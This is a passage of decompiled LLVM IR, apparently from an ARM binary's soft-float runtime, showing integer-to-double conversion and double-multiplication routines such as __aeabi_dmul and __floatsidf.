.thread6:                                         ; preds = %dec_label_pc_1efd8, %bb32
  %v1_1efe8 = phi i32 [ %v0_1efbc, %dec_label_pc_1efd8 ], [ %v1_1efe0, %bb32 ]
  ret i32 %v1_1efe8

dec_label_pc_1efec:                               ; preds = %bb31
  %v0_1efec = load i32, i32* @r1, align 4
  %v1_1efec = load i32, i32* @r3, align 4
  %v4_1efec = icmp eq i32 %v1_1efec, %v0_1efec
  br i1 %v4_1efec, label %dec_label_pc_1efec..thread8_crit_edge, label %bb33

dec_label_pc_1efec..thread8_crit_edge:            ; preds = %dec_label_pc_1efec
  %v0_1effc.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1efec
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1efec..thread8_crit_edge, %bb33
  %v0_1effc = phi i32 [ %v0_1effc.pre, %dec_label_pc_1efec..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1effc = xor i1 %v4_1efec, true
  call void @__pseudo_cond_branch(i1 %v2_1effc, i32 %v0_1effc)
  %v0_1f000 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1f000, 2097152
  br i1 %tmp45, label %dec_label_pc_1f008, label %dec_label_pc_1f01c

dec_label_pc_1f008:                               ; preds = %.thread8
  %v0_1f008 = load i32, i32* %r0.global-to-local, align 4
  %v1_1f008 = icmp slt i32 %v0_1f008, 0
  %v2_1f008 = mul i32 %v0_1f008, 2
  store i32 %v2_1f008, i32* %r0.global-to-local, align 4
  %v0_1f00c = load i32, i32* @r1, align 4
  %v3_1f00c = mul i32 %v0_1f00c, 2
  %v4_1f00c = zext i1 %v1_1f008 to i32
  %v5_1f00c = or i32 %v3_1f00c, %v4_1f00c
  %v9_1f00c = icmp ule i32 %v5_1f00c, %v0_1f00c
  %v10_1f00c = icmp ult i32 %v3_1f00c, %v0_1f00c
  %v11_1f00c = select i1 %v1_1f008, i1 %v9_1f00c, i1 %v10_1f00c
  br i1 %v11_1f00c, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1f008
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1f008, %bb34
  ret i32 %v2_1f008

dec_label_pc_1f01c:                               ; preds = %.thread8
  %v2_1f01c = icmp ugt i32 %v0_1f000, -4194305
  br i1 %v2_1f01c, label %dec_label_pc_1f01c..thread9_crit_edge, label %bb36

dec_label_pc_1f01c..thread9_crit_edge:            ; preds = %dec_label_pc_1f01c
  %v0_1f028.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1f01c
  %v1_1f020 = load i32, i32* @r1, align 4
  %v2_1f020 = add i32 %v1_1f020, 1048576
  store i32 %v2_1f020, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1f01c..thread9_crit_edge, %bb36
  %v0_1f028 = phi i32 [ %v0_1f028.pre, %dec_label_pc_1f01c..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1f028 = xor i1 %v2_1f01c, true
  call void @__pseudo_cond_branch(i1 %v2_1f028, i32 %v0_1f028)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1f05c.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1f05c.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1f048 = load i32, i32* @r3, align 4
  %v1_1f04c = load i32, i32* @r2, align 4
  store i32 %v1_1f04c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1f05c23 = phi i32 [ %v1_1f05c.pre, %.thread14 ], [ %v1_1f048, %bb37 ]
  %v1_1f058 = phi i32 [ %v0_1efbc, %.thread14 ], [ %v1_1f04c, %bb37 ]
  store i32 %v1_1f058, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1f068 = phi i32 [ %v1_1f05c23, %bb38 ], [ %v1_1f05c.pre, %.thread11 ]
  %v1_1f070 = phi i32 [ %v1_1f058, %bb38 ], [ %v0_1efbc, %.thread11 ]
  %v4_1f05c = mul i32 %v1_1f068, 4096
  %v5_1f05c = or i32 %v4_1f05c, %v1_1f070
  %v7_1f05c = icmp eq i32 %v5_1f05c, 0
  br i1 %v7_1f05c, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1f060 = load i32, i32* @r2, align 4
  %v2_1f060 = load i32, i32* @r3, align 4
  %v5_1f060 = mul i32 %v2_1f060, 4096
  %v6_1f060 = or i32 %v5_1f060, %v1_1f060
  %v8_1f060 = icmp eq i32 %v6_1f060, 0
  br i1 %v8_1f060, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1f064 = icmp eq i32 %v2_1f060, %v1_1f068
  br i1 %v5_1f064, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1f070

; uselistorder directives
  uselistorder i32 %v1_1f05c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1f00c, { 1, 2, 0 }
  uselistorder i32 %v2_1f008, { 1, 0 }
  uselistorder i1 %v1_1f008, { 1, 0 }
  uselistorder i32 %v0_1f000, { 1, 0 }
  uselistorder i1 %v4_1efec, { 1, 0 }
  uselistorder i32 %v0_1efc0, { 2, 0, 1 }
  uselistorder i32 %v0_1efbc, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1efd8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1f074 = icmp eq i32 %arg1, 0
  br i1 %v2_1f074, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1f07c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1f074, i32 %v0_1f07c)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1f094 = call i32 @function_1eeb4()
  ret i32 %v0_1f094

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1f098 = icmp eq i32 %arg1, 0
  br i1 %v2_1f098, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1f0a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1f098, i32 %v0_1f0a0)
  store i32 1074, i32* @r4, align 4
  %v1_1f0b0 = and i32 %arg1, -2147483648
  store i32 %v1_1f0b0, i32* @r5, align 4
  %v2_1f0b0 = icmp eq i32 %v1_1f0b0, 0
  br i1 %v2_1f0b0, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1f0b4 = sub i32 0, %arg1
  store i32 %v2_1f0b4, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1f0bc = call i32 @function_1eeb4()
  ret i32 %v0_1f0bc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1f0c0 = mul i32 %arg1, 2
  store i32 %v2_1f0c0, i32* %r2.global-to-local, align 4
  %v4_1f0c0 = icmp eq i32 %v2_1f0c0, 0
  %v1_1f0c4 = and i32 %v2_1f0c0, 4
  %v2_1f0c4 = icmp ne i32 %v1_1f0c4, 0
  %v3_1f0c4 = sdiv i32 %v2_1f0c0, 8
  %v3_1f0c8 = zext i1 %v2_1f0c4 to i32
  %v6_1f0c8 = zext i32 %v3_1f0c4 to i64
  %v7_1f0c8 = sub nsw i32 33, %v3_1f0c4
  %v8_1f0c8 = zext i32 %v7_1f0c8 to i64
  %v9_1f0c8 = shl i64 %v6_1f0c8, %v8_1f0c8
  %v10_1f0c8 = sub nsw i32 32, %v3_1f0c4
  %v11_1f0c8 = shl i32 %v3_1f0c8, %v10_1f0c8
  %v12_1f0c8 = zext i32 %v11_1f0c8 to i64
  %v14_1f0c8 = or i64 %v12_1f0c8, %v9_1f0c8
  %v15_1f0c8 = trunc i64 %v14_1f0c8 to i32
  store i32 %v15_1f0c8, i32* %r1.global-to-local, align 4
  %v3_1f0cc = mul i32 %arg1, 536870912
  store i32 %v3_1f0cc, i32* @r0, align 4
  br i1 %v4_1f0c0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1f0d0 = and i32 %v2_1f0c0, -16777216
  store i32 %v2_1f0d0, i32* @r3, align 4
  %v4_1f0d0 = icmp eq i32 %v2_1f0d0, 0
  br i1 %v4_1f0d0, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1f0d4 = icmp ugt i32 %v2_1f0c0, -16777217
  br i1 %v4_1f0d4, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1f0d8 = xor i32 %v15_1f0c8, 939524096
  store i32 %v2_1f0d8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1f0dc = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1f0dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f0dc, i32 %v0_1f0dc)
  %v0_1f0e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1f0e0 = icmp eq i32 %v0_1f0e0, 0
  br i1 %v2_1f0e0, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1f0e4 = load i32, i32* @r3, align 4
  %v4_1f0e4 = icmp eq i32 %v1_1f0e4, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1f0e8 = phi i1 [ true, %.thread1 ], [ %v4_1f0e4, %bb9 ]
  %v0_1f0e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f0e8, i32 %v0_1f0e8)
  store i32 896, i32* @r4, align 4
  %v0_1f0f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f0f4 = and i32 %v0_1f0f4, -2147483648
  store i32 %v1_1f0f4, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1f0f4 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1f0f8 = bitcast float %tmp11 to i32
  store i32 %v1_1f0f8, i32* @r1, align 4
  %v0_1f0fc = call i32 @function_1eeb4()
  ret i32 %v0_1f0fc

; uselistorder directives
  uselistorder i32 %v3_1f0c4, { 1, 2, 0 }
  uselistorder i32 %v2_1f0c0, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1eeb4, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1f100 = or i32 %arg2, %arg1
  %v4_1f100 = icmp eq i32 %v2_1f100, 0
  %v0_1f104 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1f100, i32 %v0_1f104)
  store i32 0, i32* @r5, align 4
  %v0_1f110 = call i32 @function_1f130()
  ret i32 %v0_1f110
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1f114 = or i32 %arg2, %arg1
  %v4_1f114 = icmp eq i32 %v2_1f114, 0
  %v0_1f118 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1f114, i32 %v0_1f118)
  %v1_1f124 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1f124, i32 ptrtoint (i32* @global_var_1f130.1723 to i32))
  %v1_1f128 = sub i32 0, %arg1
  ret i32 %v1_1f128

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1f130() local_unnamed_addr {
dec_label_pc_1f130:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1f138 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1f138, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1ee54.1721 to i32))
  %tmp6 = icmp ult i32 %v0_1f138, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1f130
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1f130, %bb
  %v1_1f150 = phi i32 [ 3, %dec_label_pc_1f130 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1f138, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1f150 = add nuw nsw i32 %v1_1f150, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1f154 = phi i32 [ %v1_1f150, %bb3 ], [ %v2_1f150, %bb4 ]
  %not. = icmp slt i32 %v0_1f138, 0
  %v4_1f154 = zext i1 %not. to i32
  %v5_1f154 = add nsw i32 %v0_1f154, %v4_1f154
  %v1_1f158 = sub nsw i32 32, %v5_1f154
  %v0_1f15c = load i32, i32* @r0, align 4
  %v6_1f15c = shl i32 %v0_1f15c, %v1_1f158
  store i32 %v6_1f15c, i32* @ip, align 4
  %v6_1f160 = lshr i32 %v0_1f15c, %v5_1f154
  %v1_1f164 = load i32, i32* @r1, align 4
  %v7_1f164 = shl i32 %v1_1f164, %v1_1f158
  %v8_1f164 = or i32 %v7_1f164, %v6_1f160
  %v6_1f168 = lshr i32 %v1_1f164, %v5_1f154
  %v0_1f16c = load i32, i32* %r4.global-to-local, align 4
  %v2_1f16c = add i32 %v0_1f16c, %v5_1f154
  store i32 %v2_1f16c, i32* @r4, align 4
  %v4_1f170 = sext i32 %v8_1f164 to i64
  %v5_1f170 = call i32 @function_1ee54(i64 %v4_1f170, i32 %v6_1f168, i32 %v5_1f154, i32 %v1_1f158)
  ret i32 %v5_1f170

; uselistorder directives
  uselistorder i32 %v5_1f154, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 25, 26, 3, 20, 21, 27, 28, 29, 30, 5, 6, 32, 2, 0, 7, 31, 1, 8, 9, 10, 11, 12, 13, 22, 14, 15, 17, 18, 19, 16, 23, 24 }
  uselistorder i32 3, { 57, 13, 43, 68, 44, 69, 70, 71, 17, 73, 9, 74, 18, 75, 76, 0, 14, 77, 10, 1, 2, 59, 79, 3, 4, 45, 46, 88, 47, 48, 49, 50, 51, 52, 80, 7, 22, 81, 72, 23, 24, 62, 25, 63, 26, 64, 27, 65, 28, 66, 56, 8, 58, 53, 89, 15, 84, 20, 85, 19, 86, 21, 83, 54, 11, 78, 12, 82, 5, 87, 55, 29, 30, 31, 60, 32, 33, 61, 34, 6, 36, 35, 42, 37, 67, 38, 39, 40, 41, 16 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1f174 = load i32, i32* @r4, align 4
  store i32 %v3_1f174, i32* %stack_var_-16, align 4
  %v12_1f174 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1f180 = udiv i32 %arg2, 1048576
  %v5_1f180 = urem i32 %v4_1f180, 2048
  store i32 %v5_1f180, i32* %r4.global-to-local, align 4
  %v6_1f180 = icmp eq i32 %v5_1f180, 0
  br i1 %v6_1f180, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1f184 = udiv i32 %arg4, 1048576
  %v6_1f184 = urem i32 %v5_1f184, 2048
  store i32 %v6_1f184, i32* @r5, align 4
  %v7_1f184 = icmp eq i32 %v6_1f184, 0
  br i1 %v7_1f184, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1f188 = icmp eq i32 %v5_1f180, 2047
  br i1 %v5_1f188, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1f18c = icmp eq i32 %v6_1f184, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1f190 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1f18c, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1f194.1726 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1f190, i32 ptrtoint (i32* @global_var_1f36c.1724 to i32))
  %v0_1f194 = load i32, i32* %r4.global-to-local, align 4
  %v1_1f194 = load i32, i32* @r5, align 4
  %v2_1f194 = add i32 %v1_1f194, %v0_1f194
  store i32 %v2_1f194, i32* %r4.global-to-local, align 4
  %v2_1f198 = xor i32 %arg4, %arg2
  %v1_1f19c = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1f19c, -2097152
  %v5_1f19c = add i32 %tmp51, -1
  %v6_1f19c = and i32 %v5_1f19c, %arg2
  store i32 %v6_1f19c, i32* %r1.global-to-local, align 4
  %v6_1f1a0 = and i32 %v5_1f19c, %arg4
  %v5_1f1a4 = mul i32 %arg2, 4096
  %v6_1f1a4 = or i32 %v5_1f1a4, %tmp32
  %v8_1f1a4 = icmp eq i32 %v6_1f1a4, 0
  br i1 %v8_1f1a4, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1f1ac5 = or i32 %v6_1f19c, 1048576
  store i32 %v1_1f1ac5, i32* %r1.global-to-local, align 4
  %v1_1f1b07 = or i32 %v6_1f1a0, 1048576
  br label %dec_label_pc_1f230

bb40:                                             ; preds = %.thread2
  %v6_1f1a8 = mul i32 %arg4, 4096
  %v7_1f1a8 = or i32 %v6_1f1a8, %arg3
  %v9_1f1a8 = icmp eq i32 %v7_1f1a8, 0
  %v1_1f1ac = or i32 %v6_1f19c, 1048576
  store i32 %v1_1f1ac, i32* %r1.global-to-local, align 4
  %v1_1f1b0 = or i32 %v6_1f1a0, 1048576
  br i1 %v9_1f1a8, label %dec_label_pc_1f230, label %dec_label_pc_1f1b8

dec_label_pc_1f1b8:                               ; preds = %bb40
  %v6_1f1b8 = mul nuw i64 %tmp, %arg1
  %v7_1f1b8 = udiv i64 %v6_1f1b8, 4294967296
  %v9_1f1b8 = trunc i64 %v6_1f1b8 to i32
  store i32 %v9_1f1b8, i32* %ip.global-to-local, align 4
  %v7_1f1c0 = zext i32 %v1_1f1ac to i64
  %v11_1f1c0 = mul nuw nsw i64 %v7_1f1c0, %tmp
  %v12_1f1c0 = add i64 %v11_1f1c0, %v7_1f1b8
  %v1_1f1c4 = and i32 %v2_1f198, -2147483648
  %v10_1f1c8 = zext i32 %v1_1f1b0 to i64
  %v11_1f1c8 = mul nuw i64 %v10_1f1c8, %arg1
  %v12_1f1c8 = add i64 %v12_1f1c0, %v11_1f1c8
  %v13_1f1c8 = udiv i64 %v12_1f1c8, 4294967296
  %v15_1f1c8 = trunc i64 %v12_1f1c8 to i32
  %v10_1f1d0 = mul nuw i64 %v10_1f1c8, %v7_1f1c0
  %v11_1f1d0 = add i64 %v13_1f1c8, %v10_1f1d0
  %v12_1f1d0 = udiv i64 %v11_1f1d0, 4294967296
  %v13_1f1d0 = trunc i64 %v12_1f1d0 to i32
  %v14_1f1d0 = trunc i64 %v11_1f1d0 to i32
  %v2_1f1d4 = icmp eq i32 %v9_1f1b8, 0
  br i1 %v2_1f1d4, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1f1b8
  %v2_1f1d8 = or i32 %v15_1f1c8, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1f1b8, %bb41
  %storemerge = phi i32 [ %v2_1f1d8, %bb41 ], [ %v15_1f1c8, %dec_label_pc_1f1b8 ]
  %v0_1f1ec = phi i32 [ %v2_1f1d8, %bb41 ], [ %v15_1f1c8, %dec_label_pc_1f1b8 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1f1dc = add i32 %v2_1f194, -255
  %v2_1f1e0 = icmp ugt i32 %v13_1f1d0, 511
  %v2_1f1e4 = icmp eq i1 %v2_1f1e0, false
  %v3_1f1e4 = add i32 %v2_1f194, -1023
  %v5_1f1e4 = sext i1 %v2_1f1e4 to i32
  %v6_1f1e4 = add i32 %v3_1f1e4, %v5_1f1e4
  store i32 %v6_1f1e4, i32* %r4.global-to-local, align 4
  %v3_1f1e8 = icmp ugt i32 %v1_1f1dc, 768
  br i1 %v3_1f1e8, label %dec_label_pc_1f1f8, label %dec_label_pc_1f1ec

dec_label_pc_1f1ec:                               ; preds = %bb42
  %v1_1f1ec = icmp slt i32 %v0_1f1ec, 0
  %v2_1f1ec = mul i32 %v0_1f1ec, 2
  store i32 %v2_1f1ec, i32* %lr.global-to-local, align 4
  %v3_1f1f0 = mul i32 %v14_1f1d0, 2
  %v4_1f1f0 = zext i1 %v1_1f1ec to i32
  %v5_1f1f0 = or i32 %v4_1f1f0, %v3_1f1f0
  %v9_1f1f0 = icmp ule i32 %v5_1f1f0, %v14_1f1d0
  %v10_1f1f0 = icmp ult i32 %v3_1f1f0, %v14_1f1d0
  %v11_1f1f0 = select i1 %v1_1f1ec, i1 %v9_1f1f0, i1 %v10_1f1f0
  %v3_1f1f425 = mul nuw nsw i64 %v12_1f1d0, 2
  %v3_1f1f4 = trunc i64 %v3_1f1f425 to i32
  %v4_1f1f4 = zext i1 %v11_1f1f0 to i32
  %v5_1f1f4 = or i32 %v4_1f1f4, %v3_1f1f4
  br label %dec_label_pc_1f1f8

dec_label_pc_1f1f8:                               ; preds = %bb42, %dec_label_pc_1f1ec
  %v0_1f208 = phi i32 [ %v0_1f1ec, %bb42 ], [ %v2_1f1ec, %dec_label_pc_1f1ec ]
  %v0_1f200 = phi i32 [ %v14_1f1d0, %bb42 ], [ %v5_1f1f0, %dec_label_pc_1f1ec ]
  %v1_1f1f8 = phi i32 [ %v13_1f1d0, %bb42 ], [ %v5_1f1f4, %dec_label_pc_1f1ec ]
  %v4_1f1f8 = mul i32 %v1_1f1f8, 2048
  %v4_1f1fc = udiv i32 %v0_1f200, 2097152
  %v5_1f1f8 = or i32 %v4_1f1fc, %v1_1f1c4
  %v5_1f1fc = or i32 %v5_1f1f8, %v4_1f1f8
  store i32 %v5_1f1fc, i32* %r1.global-to-local, align 4
  %v3_1f200 = mul i32 %v0_1f200, 2048
  %v4_1f204 = udiv i32 %v0_1f208, 2097152
  %v5_1f204 = or i32 %v3_1f200, %v4_1f204
  store i32 %v5_1f204, i32* %r0.global-to-local, align 4
  %v3_1f208 = mul i32 %v0_1f208, 2048
  store i32 %v3_1f208, i32* %lr.global-to-local, align 4
  %v1_1f20c = add i32 %v6_1f1e4, -253
  store i32 %v1_1f20c, i32* %ip.global-to-local, align 4
  %v2_1f20c = icmp ugt i32 %v6_1f1e4, 252
  %v7_1f20c = icmp eq i32 %v6_1f1e4, 253
  %v2_1f210 = xor i1 %v7_1f20c, true
  %v3_1f210 = and i1 %v2_1f20c, %v2_1f210
  br i1 %v3_1f210, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1f1f8
  %v6_1f210 = icmp ugt i32 %v1_1f20c, 1791
  %v11_1f210 = icmp eq i32 %v1_1f20c, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1f1f8, %bb43
  %v1_1f214 = phi i1 [ %v7_1f20c, %dec_label_pc_1f1f8 ], [ %v11_1f210, %bb43 ]
  %v0_1f214 = phi i1 [ %v2_1f20c, %dec_label_pc_1f1f8 ], [ %v6_1f210, %bb43 ]
  %v2_1f214 = xor i1 %v1_1f214, true
  %v3_1f214 = and i1 %v0_1f214, %v2_1f214
  call void @__pseudo_cond_branch(i1 %v3_1f214, i32 ptrtoint (i32* @global_var_1f260.1725 to i32))
  %v0_1f218 = load i32, i32* %lr.global-to-local, align 4
  %v2_1f218 = icmp slt i32 %v0_1f218, 0
  %v6_1f218 = icmp eq i32 %v0_1f218, -2147483648
  %v1_1f21c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1f218, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1f21c = urem i32 %v1_1f21c, 2
  %v3_1f21c = icmp ne i32 %v2_1f21c, 0
  %v4_1f21c = udiv i32 %v1_1f21c, 2
  store i32 %v4_1f21c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1f220 = phi i1 [ %v3_1f21c, %bb45 ], [ %v2_1f218, %bb44 ]
  %v2_1f220 = zext i1 %v1_1f220 to i32
  %v3_1f220 = add i32 %v2_1f220, %v1_1f21c
  store i32 %v3_1f220, i32* %r0.global-to-local, align 4
  %v0_1f224 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f224 = load i32, i32* %r4.global-to-local, align 4
  %v2_1f224 = and i32 %v1_1f224, 4096
  %v3_1f224 = icmp ne i32 %v2_1f224, 0
  %v4_1f224 = mul i32 %v1_1f224, 1048576
  %v6_1f224 = add i32 %v4_1f224, %v0_1f224
  %v7_1f224 = zext i1 %v3_1f224 to i32
  %v8_1f224 = add i32 %v7_1f224, %v6_1f224
  store i32 %v8_1f224, i32* %r1.global-to-local, align 4
  %v2_1f228 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1f228, i32* %r4.global-to-local, align 4
  store i32 %v12_1f174, i32* %lr.global-to-local, align 4
  ret i32 %v3_1f220

dec_label_pc_1f230:                               ; preds = %.thread3, %bb40
  %v1_1f23c = phi i32 [ %v1_1f1b07, %.thread3 ], [ %v1_1f1b0, %bb40 ]
  %v1_1f234 = phi i32 [ %v1_1f1ac5, %.thread3 ], [ %v1_1f1ac, %bb40 ]
  %v1_1f230 = and i32 %v2_1f198, -2147483648
  %v2_1f234 = or i32 %v1_1f234, %v1_1f230
  %v4_1f2381 = or i64 %tmp, %arg1
  %v4_1f238 = trunc i64 %v4_1f2381 to i32
  store i32 %v4_1f238, i32* %r0.global-to-local, align 4
  %v2_1f23c = xor i32 %v2_1f234, %v1_1f23c
  store i32 %v2_1f23c, i32* %r1.global-to-local, align 4
  %v4_1f240 = udiv i32 %v1_1f19c, 2
  %v5_1f240 = sub i32 %v2_1f194, %v4_1f240
  store i32 %v5_1f240, i32* %r4.global-to-local, align 4
  %v7_1f240 = sub i32 0, %v5_1f240
  %v8_1f240 = and i32 %v2_1f194, %v7_1f240
  %v11_1f240 = icmp eq i32 %v2_1f194, %v4_1f240
  %v7_1f244 = icmp sgt i32 %v2_1f194, %v4_1f240
  br i1 %v7_1f244, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1f230
  %v10_1f244 = sub i32 %v1_1f19c, %v5_1f240
  %v12_1f244 = xor i32 %v5_1f240, %v1_1f19c
  %v13_1f244 = xor i32 %v10_1f244, %v1_1f19c
  %v14_1f244 = and i32 %v13_1f244, %v12_1f244
  %v17_1f244 = icmp eq i32 %v1_1f19c, %v5_1f240
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1f230, %bb46
  %v3_1f250.in = phi i32 [ %v8_1f240, %dec_label_pc_1f230 ], [ %v14_1f244, %bb46 ]
  %v2_1f250.in = phi i32 [ %v5_1f240, %dec_label_pc_1f230 ], [ %v10_1f244, %bb46 ]
  %v1_1f250 = phi i1 [ %v11_1f240, %dec_label_pc_1f230 ], [ %v17_1f244, %bb46 ]
  %v2_1f250 = icmp slt i32 %v2_1f250.in, 0
  %v3_1f250 = icmp slt i32 %v3_1f250.in, 0
  %v3_1f248 = xor i1 %v3_1f250, %v2_1f250
  %v4_1f248 = or i1 %v1_1f250, %v3_1f248
  br i1 %v4_1f248, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1f250.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1f24830 = mul i32 %v5_1f240, 1048576
  %v10_1f24831 = or i32 %v2_1f23c, %v9_1f24830
  store i32 %v10_1f24831, i32* %r1.global-to-local, align 4
  %v7_1f24c = load i32, i32* %stack_var_-16, align 4
